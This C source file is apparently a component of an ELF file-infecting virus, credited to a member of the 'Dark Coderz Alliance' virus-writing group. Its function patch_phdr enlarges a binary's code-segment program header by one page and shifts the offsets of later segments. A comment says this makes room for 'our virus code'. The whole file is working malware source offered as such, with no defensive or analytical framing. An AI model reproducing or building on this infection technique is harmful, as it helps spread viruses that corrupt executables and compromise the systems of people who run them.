/*
     .........................................................
     :         ____ ___.__. ____   ____  _______  ___        :
     :       _/ ___<   |  |/    \_/ __ \/  _ \  \/  /        :
     :       \  \___\___  |   |  \  ___(  <_> >    <         :
     :        \___  > ____|___|  /\___  >____/__/\_ \        :
     :            \/\/         \/     \/           \/        :
     :                   __www.cyneox.tk_                    :
     :                                                       :
     :                                                       :
     :                        member of                      :
     :                                                       :
     :             _______  _________     _____              :
     :            \______ \ \_   ___ \   /  _  \             :
     :             |    |  \/    \  \/  /  /_\  \            :
     :             |    `   \     \____/    |    \           :
     :            /_______  /\______  /\____|__  /           :
     :                    \/        \/         \/            :
     :                ( Dark Coderz Alliance )               :
     :                   __www.dca-vx.tk__                   :
     :.......................................................:

*/

/* 
     Description : PHDR ( Program Header) will be patched ...
*/


#include "../defines.h"

int patch_phdr(Infect *file)
{
	Elf32_Phdr *phdr_code, *phdr;
	off_t end_of_cs;

	unsigned int num;
	
	phdr_code=file->phdr_code;
        
	/* patch p_filesz and p_memsz to reflect the insertion 
	   of our virus code
	*/

	phdr_code[0].p_filesz += ELF_PAGE_SZ;
	phdr_code[0].p_memsz += ELF_PAGE_SZ;
	
	end_of_cs=file->end_of_codes;
	phdr=file->phdr;

	for(num=file->mmap.ehdr->e_phnum;num>0;num--,phdr++)
	{
	        /* patchin p_offset ... */ 
		if(phdr->p_offset>=end_of_cs)
			phdr->p_offset += ELF_PAGE_SZ;
	}
	
	printf("__ [ patch _ phdr ] __\n");
	printf("new phdr_code.p_filesz=0x%x\n",phdr_code[0].p_filesz);
	printf("new phdr_code.p_memsz=0x%x\n\n",phdr_code[0].p_memsz);
	
        
	return true;
}
